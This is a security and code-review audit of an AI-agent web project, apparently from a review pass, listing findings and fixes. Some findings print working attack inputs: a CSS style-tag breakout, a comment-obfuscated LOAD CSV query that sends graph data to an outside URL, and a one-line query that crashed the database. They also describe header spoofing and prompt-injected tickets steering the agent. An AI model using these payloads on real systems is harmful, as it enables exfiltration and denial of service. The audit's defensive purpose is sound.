# Ponytail audit (Gate 2, early pass)

Date: 2026-10-18 · Scope: tracked code on `main` (15628da): contracts, gen, agent, bench, ui, landing, deploy, blog, scripts. Excluded: node_modules, dist, docs. Nothing was edited.

Protected (never cut): receipts (`query_id`, `$as_of`), benchmark honesty clauses, ACL tiers, zod contracts, the html guard, tests.

Security checks that came back clean:
- **Secrets:** no keys or passwords in tracked files or in git history. `.env` and `*.sqlite*` are ignored, and `.env.example` holds placeholders only.
- **Cypher:** every runtime value is passed as a `$param`. The only interpolations are constants from the contracts: labels, edge types, keys, `EMBED_DIM`, `DAY`, `VALID_FOREVER`, and the `NODE_AS_OF`/`EDGE_AS_OF` fragments (`gen/load.ts:75-113`, `bench/cypher.ts`, `agent/dream/cypher.ts`).
- **Path traversal:** `deploy/static.ts:22-28` decodes the path, runs `join` and then checks the root prefix. Encoded `..` and `%2F` are rejected, and `deploy/static.test.ts:17` covers it. A `%00` makes `statSync` throw, which is caught and returns false.
- **ACL:** user conversations read through `mochi_reader` (`agent/harness.ts:106,120`). teach and feedback write only `team_*` through `user_demo`. `record_resolution` is removed from `userAgent` (`agent/harness.ts:275`) and writes through `mochi_dream`. `.mcp.json` connects as `mochi_reader` in strict read-only mode.
- **CopilotKit:** `openGenerativeUI` is never set. Rich UI comes only from `ACTIVITY.card` / `ACTIVITY.html`, which tool code emits.
- **UI XSS:** `StoryMarkdown` runs with `skipHtml` and react-markdown's default URL transform. Every blog `innerHTML` goes through `esc()`. The iframe uses `sandbox=""` plus `default-src 'none'`.

## Must fix

1. **CSS breaks out of `<style>` and bypasses the html guard.** In `contracts/html-guard.ts:45-50`, `HTML_RULES` and the digit check run on `h.html` only. `ui/src/components/sandbox.tsx:20` then pastes `value.css` raw into `<style>${value.css}</style>`. As a result, `css = "}</style><p>Revenue 42</p><a href=https://evil.example>…"` passes `validateSandboxHtml` (verified: `{"ok":true}`). That gives literal numbers with no receipt and external links inside the app frame. CSP and the sandbox still block scripts and loads.
   Fix: add `[/</, '"<" is not allowed in CSS']` to `CSS_RULES`, plus one test line.

2. **`POST /api/dream/run` is open to the internet with `access-control-allow-origin: *`.** At `agent/server.ts:35,63-66`, any visitor, or any web page through a simple cross-origin POST, can trigger a full dream on the live deploy. That spends LLM budget and writes `mochi_company` through `mochi_dream`. Nothing serializes it against the scheduled `DreamTask`, so two runs race on `prev`/`scratch` delete and copy (`agent/dream/index.ts:71-76,138`).
   Fix: return 403 unless `req.headers['x-mochi-admin'] === process.env.MOCHI_ADMIN_TOKEN` (unset means disabled), and drop the `*` CORS header from that route.

3. **Any error counts as an ACL refusal.** `bench/runs/isolation.ts:11` sets `refused: true` on every exception: a dropped connection, a timeout, a syntax error or a missing graph. The ledger then publishes "4/4 refused".
   Fix: `refused: /NOPERM|no permissions/i.test(msg)`, and assert the same in `bench/runs.test.ts:76`.

4. **The cluster ablation is circular.** In `bench/runs/clusters.ts:41-46,52`, the graph side clusters ABOUT edges that `gen/load.ts:41,48` seeded straight from the true `issue_id`, then scores them against that same `issue_id`, with `tokens: 0`. The LLM side only sees raw text. A win is guaranteed, which breaks the honesty clause.
   Fix: cluster on the ABOUT edges the dream extracted (a scratch copy with ingest marks stripped, tokens counted as in `ablation.ts:32-38`). At minimum, state "graph side uses seeded issue labels" in the ledger row's `measured_against` (`bench/ledger.ts:41`).

5. **Ship blocker: the blog has no figures.** In `mochi-brain-blog.html:493`, every `BENCH` field is null and `bench/results.json` does not exist. `blog/fill-bench.ts:9` only looks for TODO/PLACEHOLDER markers, so it passes an empty fill.
   Fix: run the bench, then `node blog/fill-bench.ts`, and make `fill()` throw when `run_at` is null.

6. **The deployed `/app` shows fixture numbers next to real-looking Cypher receipts.** `ui/src/screens/Report.tsx:2,7`, `Overview.tsx` and `Chat.tsx` read from `ui/fixtures`, and `shell.tsx:40` hardcodes the fixture id `r7KxQ2mVn8LpT4sW`. Some fixture receipts would not even run: `ui/fixtures/index.ts:14` uses `r.hours`, which is not a contract property, and line 26 calls `date()` on epoch ms.
   Fix: fetch `GET /api/stories/:id` in Report (the wire-ui change), or label the fixture screens "sample data" until then.

## Should fix

7. **A failed connect is cached forever.** At `agent/db.ts:22-26`, if FalkorDB is not up the first time a connection is made, the rejected promise stays in `pool` and every later call fails until restart.
   Fix: `p.catch(() => pool.delete(u.user))` when it is set.

8. **The CopilotKit endpoint has no authentication or cap.** At `agent/server.ts:41-49`, anyone with the URL can drive the model on our Anthropic key. Threads are `ownerless`, so `PiRunner.connect` (`agent/agui.ts:213-218`) replays any transcript to whoever presents its threadId. The CORS list only allows localhost:5173, which is fine for production because the app is same-origin.
   Fix: a per-IP run counter, or a `MOCHI_MAX_RUNS_PER_HOUR` check in `PiDurableAgent.run` before `conv.submit`.

9. **Unauthenticated chat becomes company doctrine with no review.** `teach` (`agent/harness.ts:195-207`) writes a `DoctrineCandidate`, and `commitDoctrine` (`agent/dream/index.ts:160-180`) commits every candidate as a company `Policy`. It only dedups; nothing reviews the content. A public visitor, or prompt-injected ticket text, can write doctrine into the company tier. The `taught_by` provenance survives.
   Fix: commit only candidates with `approved_at` set, or only when `taught_by` is in a known `AgentUser` list.

10. **The smoke test fails on a route that does not exist.** `deploy/smoke.sh:14` expects 200 from `/api/stories`, but no list route exists yet, so the server returns 404 (`agent/server.ts:54,68`).
    Fix: drop `/api/stories` from the loop until wire-ui lands.

11. **FalkorDB ports are open on all interfaces.** `docker-compose.yml:7` publishes 6379 and 3000 (the Browser, admin login) on 0.0.0.0.
    Fix: `ports: ["127.0.0.1:6379:6379", "127.0.0.1:3000:3000"]`.

12. **The app gets the admin password it never uses.** `deploy/railway.md:48` and `docker-compose.prod.yml:12` (`env_file: .env`) pass `FALKORDB_PASSWORD` to the app. The app only connects as ACL users (`agent/db.ts`).
    Fix: remove that row from railway.md, and pass only the three tier passwords in prod compose.

13. **The guard misses three ways to show literal numbers.** These need no breakout: `content: attr(data-x)` with `data-x="42"`, `<input value="42">`, and `<ol start="41">` (verified: each passes). See `contracts/html-guard.ts:12-26`.
    Fix: add `/attr\s*\(/i` to `CSS_RULES`, plus `<\s*(input|ol|meter|progress|select|textarea)\b` to the disallowed elements.

14. **Zeros that look measured.** If the server section fails, `bench/run.ts:31,99` writes all-zero server figures, and `bench/runs/server.ts:6,22-28` turns missing values into 0 with `|| 0` / `?? 0`.
    Fix: throw on missing values so the section fails as not measured. Making `server` nullable is a contracts change and needs its own proposal.

15. **Dropped dream batches vanish.** `bench/deps.ts:44-51` turns LLM errors into silently dropped extraction batches, so arm D runs on a partial world with ingestion cost under-reported.
    Fix: throw when `report.dropped > 0` in `ensureWorld` and `armD.prepare` (`bench/arms/d.ts:30,82`).

16. **The headline table is always empty.** `per_task` (SPEC §3, per model × arm) is never produced and ships as `[]` (`bench/run.ts:107-113`, `contracts/results.ts:29`).
    Fix: compute it from the records in `run.ts`, or remove it through a contracts change.

17. **`--fresh` can merge into the old graph.** `gen/load.ts:72` swallows every delete error, including NOPERM.
    Fix: rethrow unless the message matches not-exists, as `ignoreMissing` does in `agent/dream/index.ts:39`.

18. **`--only` mixes runs.** It merges sections from an older run under a new `run_at`, `model` and `judge`, and never validates the old file (`bench/run.ts:64-68,109`).
    Fix: call `validateResults(prev)` and keep the old `run_at` unless `main` runs.

19. **The landing receipts claim rows the Cypher never produced.** `landing/fixtures/record.ts:24-60,183,278` computes the rows in JS from `dataset.json`, but the popover says "recorded from the seeded demo" (`landing/src/parts/ui.tsx:111`).
    Fix: record through `roQuery` against the loaded graph, or change the caption to "computed from data/dataset.json".

20. **`landing/src/parts/Card.tsx` breaks on empty data.** Line 9 crashes on empty `q.rows`. Line 37 gets a max of -Infinity on empty rows and NaN widths when every value is 0.
    Fix: `q.rows[0]?.[b.column]` and `Math.max(1, …)`, as `ui/src/components/blocks.tsx:44` does.

21. **One bad suggestion drops the whole morning report.** `agent/dream/report.ts:19-21`: if model prose breaks `parseStory`, the report is null.
    Fix: on a parse failure, rebuild with `templateProse`.

22. **The blog shader hardcodes a colour.** It sets `vec3(0.969,0.973,0.980)` instead of using a mochi token, which is token drift.
    Fix: read `--bg-page` with `getComputedStyle` and pass it as a uniform.

## Consider (cuts: ponytail tags)

- `yagni` **Delete `deploy/start.ts`.** Its own comment marks it as interim. Add `if (serveStatic(req, res)) return;` before the 404 at `agent/server.ts:68`, point `npm start`/`CMD` at `agent/server.ts`, and delete start.ts (-18 lines).
- `yagni` **Delete the dynamic dream loader.** `agent/dream-port.ts` exists "so the agent builds without the dream installed", but the dream is merged. Import `./dream/index.ts` directly and delete the port and `DREAM_NOT_INSTALLED` (-25 lines, plus the 503 branch).
- `yagni` **Use a static import for gen.** The `genSpec` lazy import at `agent/queries/index.ts:252-254` is there "before gen merges", yet `@mochi/gen` is already an agent dependency. Use a static `import { embed } from '@mochi/gen'`.
- `shrink` **Merge the two token checks.** `ui/check-tokens.ts` and `landing/check-tokens.ts` are the same script. Move the colour rule into `contracts/type-lint.ts` `RULES` (-20 lines).
- `shrink` **Reuse the ui components in landing.** `landing/src/parts/ui.tsx` and `Card.tsx` re-implement ui's receipts, blocks, markdown and ds, and landing already depends on `@mochi/ui`. Export from ui and keep only the landing motion (about -250 lines).
- `stdlib` **Use `Map.groupBy`.** The `m.set(k, [...(m.get(k) ?? []), x])` grouping is O(n²) in `agent/dream/rules.ts:45,65`, `agent/dream/index.ts:143` and `bench/runs/clusters.ts:45`. The repo already requires Node 24.
- `shrink` **One connect helper.** There are three: `bench/db.ts:5`, `contracts/testdb.ts:14` and `agent/db.ts:14`. bench can import agent's.
- `shrink` **One fork-retry helper.** The GRAPH.COPY "could not fork" retry appears in both `agent/dream/index.ts:73-76` and `bench/runs/concurrency.ts:19-24`.
- `shrink` **One median.** It is defined in both `gen/eval.ts:6` and `agent/dream/rules.ts:29`. Keep the `landing/fixtures/record.ts:24` lower-median on purpose, renamed `percentileDisc`.
- `delete` **Remove the Freshdesk-named codes.** `FD_STATUS`/`FD_PRIORITY`/`FD_SOURCE` at `contracts/data.ts:13-15` are used only by the tests. The repo must stay clear of real-vendor naming. This is a contracts change.
- `delete` **One morning-report summary.** `summarize()` at `agent/dream/report.ts:74` duplicates the harness `morning_report` section (`agent/harness.ts:226`).
- `delete` **Drop the dead bench wrapper.** The `queries` wrapper in `bench/deps.ts:30-37` has one caller (`bench/runs/concurrency.ts:40`). Import `briefing` directly.
- **Fix the `.dockerignore` entry.** `.dockerignore:11` excludes `bench/runs`, which is source code. The artifacts live in `bench/artifacts/`, so fix the entry.
- **Run as non-root.** Add `USER node` after `mkdir -p /data && chown node /data` in the `Dockerfile`.
- **Stop leaking error messages.** The 500 handler echoes internal error text to clients (`agent/server.ts:71`). Return a generic message and log the detail.
- **Check the WebSocket origin.** The upgrade at `agent/server.ts:85` does not check `Origin`. The data is read-only, so the risk is low.
- **Fix the comment drift in `agent/db.ts:2`.** It says user_demo writes `user_*`, but the ACL grants `~user_demo`, not `~user_*`.
- **Throw instead of exiting.** `openHarness` calls `process.exit(1)` inside a library function (`agent/harness.ts:98-101`).
- **Escape all of `<` in the bench JSON.** `blog/fill-bench.ts:21` escapes only `</`. Escape every `<` as `<`.
- **Stop the footer clock off-screen.** `landing/src/sections/Close.tsx:74` runs a 1-second interval forever. Run it only while the footer is in view.

net: about -360 lines possible, -0 deps.

# Final review (Gate 2, `/ponytail-review` + security pass)

Date: 2026-10-18 · Scope: `git diff 15628da..HEAD` at a3b95ab, without node_modules, dist, data/ and lockfiles. The focus was sim/, agent/api, agent/queries/graph-tools.ts, agent/memory.ts, agent/stories.ts, ui chat and story-panel, bench arm E and merge, and gen/embed.ts. Nothing was edited.

The probes ran against the local FalkorDB v4.22.1 as `mochi_reader`. One of them (`UNWIND range(1,300000000)`) killed the container. It restarted and reloaded from the AOF in about 8 s. See must-fix F2.

## The six early must-fixes: re-check

| # | Status | Evidence |
|---|---|---|
| 1 CSS breakout | **Fixed** | `contracts/html-guard.ts:13` rejects `<`. `cssSources` (`:31-35`) covers `h.css`, `<style>` blocks and inline styles. Rerunning the original exploit now returns `{"ok":false}`. |
| 2 open `/api/dream/run` | **Fixed**, with one gap | `agent/server.ts:79` checks `isAdmin` (`agent/api/visitor.ts:37-40`), and the check fails closed when the token is unset. `json()` sends no CORS headers (`agent/api/index.ts:10-14`). The UI token is dev-only (`ui/src/data/api.ts:113`), and the token is not in `ui/dist`. Gap: `dreamState.running` serializes HTTP runs only, not the scheduled `DreamTask`. See F9. |
| 3 isolation counts any error | **Fixed** | `bench/runs/isolation.ts:12,18` counts only `NOPERM`, "no permissions" or the read-only error as a refusal. `bench/runs.test.ts:78` asserts this. |
| 4 circular cluster ablation | **Fixed** | `bench/runs/clusters.ts:1-4,49-52` uses CDLP over the dream's `SIMILAR_TO` and never reads `ABOUT`. Dream tokens are counted (`:44`), and the ledger row says so (`bench/ledger.ts:47`). |
| 5 blog has no figures | **Fixed** | The `BENCH` block holds `run_at 1792319159413`, identical to `bench/results.json`. The comment at `blog/fill-bench.ts:3` says `fill()` relies on `validateResults` to require a non-null `run_at`. No case-sensitive TODO/PLACEHOLDER markers remain. |
| 6 fixture numbers in `/app` | **Fixed** | Report and Overview now read through `ui/src/data/api.ts`, and the hardcoded fixture id is gone. Fixtures remain only in `screens/Preview.tsx` and as types. |

## Security pass on the new surfaces

**`query_graph`: is read-only database-enforced?** Yes. `mochi_reader` has only `+GRAPH.RO_QUERY` (`contracts/graph.ts:92`). The user and cust tiers run through `user_demo` but still call `roQuery` (`agent/queries/graph-tools.ts:39`), and FalkorDB refuses writes inside `RO_QUERY` ("graph.RO_QUERY is to be executed only on read-only queries"). `CALL db.idx.fulltext.createNodeIndex` is refused the same way. Other users' graphs: there is only one user graph, `user_demo` (`agent/memory.ts:13`). `mochi_reader` gets NOPERM on it, and `user_demo`'s ACL reaches no other `user_*`. Two holes remain: **LOAD CSV** and **memory**.

**`graph_algorithm`: does model input reach mochi_dream writes?** No. Every interpolated label or edge passes `names()` (`graph-tools.ts:145-149`) or comes from database rows (`labels(a)[0]`). Ids, `area` and the scratch rows are `$params`. `top`, `maxLen` and `depth` go through `clampInt`, so the worst a bad value produces is `NaN` and a syntax error. The scratch graph name comes from the harness graph, never from args.

**Stories:** the owner check holds. `setStoryStatus` (`agent/stories.ts:61`) and `edit_story` (`agent/harness.ts:210`) require `meta.owner === vid`. `visible()` (`stories.ts:39-49`) gives a stranger only the versions in `published`, and gives nothing once the story is unpublished. So `/story/:id@n` on a draft version returns 404, and the WebSocket path uses the same `visible()`. The cookie is `SameSite=Lax`, so a cross-site POST to publish carries no vid. No leak found.

**Sim auth, admin token, chat limit:** see F3, F4, F12 and F13 below.

### Must fix

F1. **`LOAD/**/CSV` bypasses the precheck, and FalkorDB fetches any https URL from inside `RO_QUERY`** (`agent/queries/graph-tools.ts:17,22`).
- Cause: `strip` deletes comments without leaving a space, so `LOAD/**/CSV` becomes `LOADCSV` and misses `/LOAD\s+CSV/`. Cypher treats a comment as whitespace, so the database still parses `LOAD CSV`. A backtick identifier holding a `'` also derails the string stripper.
- Verified as `mochi_reader`: `LOAD/**/CSV FROM 'https://raw.githubusercontent.com/…/data.csv'` returned rows, and `MATCH (t:Ticket) … LOAD CSV FROM 'https://…?x=' + t.id` fetched with graph data in the URL.
- Impact: SSRF from the database host, and an exfiltration channel that prompt-injected ticket or answer text can trigger. Stored receipts re-fetch the URL on every public `GET /api/stories/:id` rerender. The DB ACL cannot stop it, because `LOAD CSV` is a read clause.
- Smallest fix: test the raw text (not the stripped one) with `/\bLOAD\b/i`, or make `strip` replace comments with `' '` and match `/\bLOAD\b/i`. Add the `LOAD/**/CSV` case to `graph-tools.test.ts`.

F2. **Model-written Cypher can kill FalkorDB** (`docker-compose.yml:17`, `deploy/railway.md:34`).
- `QUERY_MEM_CAPACITY` is 0, meaning unlimited. One `UNWIND range(1,300000000) AS x RETURN count(x)` as `mochi_reader` killed the container. There was no bug report and `restarts=1`. `TIMEOUT 5000` does not help, because memory runs out first.
- Any chat visitor can ask for this through `query_graph`, so the live deploy has a one-line DoS.
- Smallest fix: add `QUERY_MEM_CAPACITY 268435456` (256 MB, per query) to `FALKORDB_ARGS` in both places.

F3. **The chat rate limit can be bypassed with a spoofed header** (`agent/api/visitor.ts:26`).
- `ipOf` takes the leftmost `X-Forwarded-For` entry, which the client controls. A new random value on each request gets a fresh window every time. It also grows `hits` (`:25`) without bound.
- Smallest fix: `req.headers['x-real-ip'] ?? XFF.split(',').at(-1)`, which is the hop the proxy adds, falling back to `remoteAddress`.

F4. **`/suggest` runs the agent without the limit** (`agent/server.ts:50`).
- The limit only matches `/\/run$/`. CopilotKit's `POST /api/copilotkit/agent/mochi/suggest` clones the agent and calls `PiDurableAgent.run` → `conv.submit` (`agent/agui.ts:105,208`): a full model and tool run on our key, with no cap.
- Smallest fix: `/\/(run|suggest)$/`, or count every POST under `/api/copilotkit`.

### Should fix

F5. **All visitors share one personal memory** (`agent/memory.ts:13`, `agent/harness.ts:140`).
- Every visitor writes `remember` into `user_demo` under `AgentUser {id: 'A-1'}`. Every briefing's "From your memory" then shows other strangers' text. `query_graph` can also read the whole `user_demo` graph.
- This is both cross-visitor leakage and prompt-injection persistence.
- Smallest fix: key the preference node by `caller.vid` (`user: caller.vid ?? caller.user` in `remember` and `readPreferences`), and drop `g === userGraph` from `graphs`. The `ponytail:` note at `memory.ts:11` already names the ceiling. This change keeps the tier.

F6. **The public desk writes into company memory with no cap** (`agent/api/index.ts:42-43`).
- `POST /api/tickets/:id/answer` resolves sim tickets and appends visitor text to `cust_*` episodes (`agent/api/tickets.ts:133-158`). That text shows in "This customer before" and in the model's context.
- `/brief` also appends an episode on every call, and `answered` (`tickets.ts:132`) grows per `requestId`.
- Smallest fix: put `overLimit(ipOf(req))` in front of both POSTs.

F7. **`rerender` breaks stories that cite a user or cust tier query** (`agent/stories.ts:98-100`).
- It replays every receipt as `mochi_reader`, which has no access to `user_demo` or `cust_*`. A story citing a `query_graph` on those tiers returns 500 on every load.
- Smallest fix: keep those receipts as snapshots, as scratch ones already are: `if (!/^(mochi_company|team_)/.test(q.graph)) return [qid, q]`.

F8. **The scratch algorithm query has no timeout** (`agent/queries/graph-tools.ts:267`).
- It runs as `mochi_dream` without `TIMEOUT`. Every other path passes one.
- Smallest fix: `{ params: …, TIMEOUT: 30_000 }`.

F9. **The manual dream and the scheduled `DreamTask` can still race** (`agent/server.ts:80`, `agent/dream/index.ts:242`).
- The two runs race on the `prev`/`scratch` copy, and the graph_algorithm lock (`graph-tools.ts:92-95`) does not cover the dream either.
- Smallest fix: one module-level promise chain in `runDreamNow`, shared with `serial` in graph-tools.

F10. **The merge publishes zeros as if they were measured** (`bench/merge.ts:27`).
- When no shard has `server`, the merge writes all-zero server figures. This is the same honesty issue as early #14. Today's results.json is real, but the next merge could ship zeros.
- Smallest fix: throw `server section missing` instead of using the fallback.

F11. **The prod compose reopens FalkorDB on all interfaces** (`docker-compose.prod.yml:8`).
- `ports: !override ["6380:6379"]` binds 0.0.0.0, which undoes early #11 for prod.
- Smallest fix: `["127.0.0.1:6380:6379"]`.

### Consider

- F12. **Sim auth fails open to a known key** (`sim/server.ts:38`). `apiKey` defaults to `'sim-key'`, and the agent client has the same default (`agent/api/sim.ts:17`). The sim also listens on all interfaces. It is not deployed publicly yet (`deploy/railway.md:6`), but fix it before it is: refuse to start without `SIM_API_KEY` outside dev, and cap `readBody` (`:113`) as `agent/api/index.ts:18` does.
- F13. **The admin token check is weak in two ways.** It uses a plain `===` (`agent/api/visitor.ts:39`); use `timingSafeEqual` on equal-length buffers. And `.env.example:25` ships `change-me-admin-token`; have `isAdmin` treat that literal as unset.
- F14. **Public story reads are unthrottled** (`agent/server.ts:68-75`). Each `GET /api/stories/:id?asOf=` replays every stored query, so the cost of one GET grows with the number of receipts. Fix: cache by `(id, version, asOf rounded to a minute)`, or rate-limit with `overLimit`.
- F15. **Name checks accept prototype keys** (`graph-tools.ts:114,146-148`; `contracts/graph.ts` `checkCypherNames`). `in L` / `in E` accept `constructor` or `toString`. It is harmless, because no quote can get through, but `Object.hasOwn(L, l)` says what is meant.
- F16. **A comment overstates the read-only path** (`graph-tools.ts:3`). It says "as mochi_reader", but user and cust tiers run through `user_demo`. They are still `RO_QUERY`, so only the comment needs fixing.

## Over-engineering (`/ponytail-review` of the diff)

- `agent/server.ts:11,78,147`: yagni. `dream-port.ts`/`DREAM_NOT_INSTALLED`/`loadDream` is still a dynamic loader for a dream that has been merged (early consider). Import `./dream/index.ts` directly and delete the 503 branch.
- `agent/api/visitor.ts:12-13`: delete. There are two stacked doc comments on `cookieVid`, and the first describes `visitorId`. Keep one.
- `agent/queries/graph-tools.ts:124-125`: stdlib. Hand-rolled grouping. Use `Map.groupBy(rows, (r) => `${r.la}|${r.lb}`)`, as `bench/runs/clusters.ts:52` already does.
- `agent/queries/graph-tools.ts:62-63,129`: shrink. The inner `const edges` shadows the outer `edges` counter. Rename it `merges`. This is a 3 AM trap, not a bug.
- `bench/arms/e.ts:258`: delete. `mkdtempSync` is never cleaned up, so each `prepare()` leaves a SQLite file in tmp. Use one path per run, or `rmSync` it in `prepare`.
- `ui/src/components/chat/README.md`: delete. It is an interface note inside an HTML comment in a component folder. Put the prop types on `Composer`/`MessageList` instead (-14 lines).
- `ui/src/main.tsx:26` + `screens/Preview.tsx`: yagni. The fixture gallery ships in the prod bundle. Gate it on `import.meta.env.DEV` so fixture numbers never reach the deploy.
- `sim/`, `gen/embed.ts`, `bench/merge.ts`, `agent/stories.ts`, `agent/memory.ts`, `story-panel.tsx`, the rest of `ui/src/components/chat/`: lean already.

net: about -45 lines possible, -0 deps. Must-fix: 4 (F1–F4), all short diffs. None of these cuts touch receipts, honesty clauses, ACL tiers, validation or tests.
